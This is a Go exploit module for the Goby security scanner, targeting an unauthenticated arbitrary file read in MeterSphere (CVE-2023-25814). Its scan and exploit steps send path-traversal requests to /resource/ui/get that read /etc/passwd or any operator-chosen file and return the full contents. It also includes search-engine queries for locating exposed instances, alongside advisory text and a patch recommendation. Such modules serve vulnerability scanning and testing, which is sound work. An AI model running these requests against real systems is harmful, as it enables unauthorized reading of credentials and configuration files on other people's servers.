package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "MeterSphere File Read Vulnerability(CVE-2023-25814)",
    "Description": "<p>MeterSphere is a one-stop open source continuous testing platform, covering functions such as test tracking, interface testing, UI testing and performance testing, and is fully compatible with mainstream open source standards such as JMeter and Selenium.</p><p>MeterSphere has an unauthorized arbitrary file read vulnerability.</p>",
    "Product": "MeterSphere",
    "Homepage": "https://github.com/metersphere/metersphere",
    "DisclosureDate": "2023-03-10",
    "Author": "sunying",
    "FofaQuery": "title=\"MeterSphere\"",
    "GobyQuery": "title=\"MeterSphere\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extremely insecure website.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://github.com/metersphere/metersphere\">https://github.com/metersphere/metersphere</a></p>",
    "References": [
        "https://github.com/metersphere/metersphere/security/advisories/GHSA-fwc3-5h55-mh2j"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "createSelect",
            "value": "./../../../../../../../../../../../../../../../../etc/",
            "show": ""
        },
        {
            "name": "fileName",
            "type": "createSelect",
            "value": "passwd,hosts",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/resource/ui/get?fileName=passwd&reportId=./../../../../../../../../../../../../../../../../etc/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": ":x:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/resource/ui/get?fileName={{{fileName}}}&reportId={{{filePath}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(?s)(.*)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2023-25814"
    ],
    "CNNVD": [
        "CNNVD-202303-689"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "MeterSphere 文件读取漏洞（CVE-2023-25814）",
            "Product": "MeterSphere",
            "Description": "<p>MeterSphere 是一站式开源持续测试平台, 涵盖测试跟踪、接口测试、UI 测试和性能测试等功能，全面兼容 JMeter、Selenium 等主流开源标准。</p><p>MeterSphere存在未授权任意文件读取漏洞。<br><br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://github.com/metersphere/metersphere\">https://github.com/metersphere/metersphere</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "MeterSphere File Read Vulnerability(CVE-2023-25814)",
            "Product": "MeterSphere",
            "Description": "<p>MeterSphere is a one-stop open source continuous testing platform, covering functions such as test tracking, interface testing, UI testing and performance testing, and is fully compatible with mainstream open source standards such as JMeter and Selenium.</p><p>MeterSphere has an unauthorized arbitrary file read vulnerability.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://github.com/metersphere/metersphere\">https://github.com/metersphere/metersphere</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extremely insecure website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "7376"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
